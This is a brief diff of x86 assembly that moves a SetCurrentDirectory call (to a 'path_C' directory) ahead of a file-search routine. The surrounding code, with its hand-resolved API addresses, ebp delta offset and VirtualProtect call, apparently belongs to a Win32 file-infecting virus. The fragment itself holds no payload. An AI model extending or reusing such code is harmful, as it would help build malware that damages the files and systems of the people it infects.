@@ -113,6 +113,11 @@ find_API:
 	
 	call find_APIAddress						      ; now get api address 
 	
+	
+	lea eax,offset path_C
+	add eax,ebp
+	push eax
+	call [ebp+SetCurrentDirectoryAddress]
 	call find_first_file
 	
 	invoke ExitProcess,0
@@ -123,11 +128,6 @@ find_API:
 	call [ebp+VirtualProtectAddress]
 	
 find_first_file:
-	lea eax,offset path_C
-	add eax,ebp
-	push eax
-	call [ebp+SetCurrentDirectoryAddress]
-	
 	lea eax,offset Win32Data
 	add eax,ebp
 	push eax
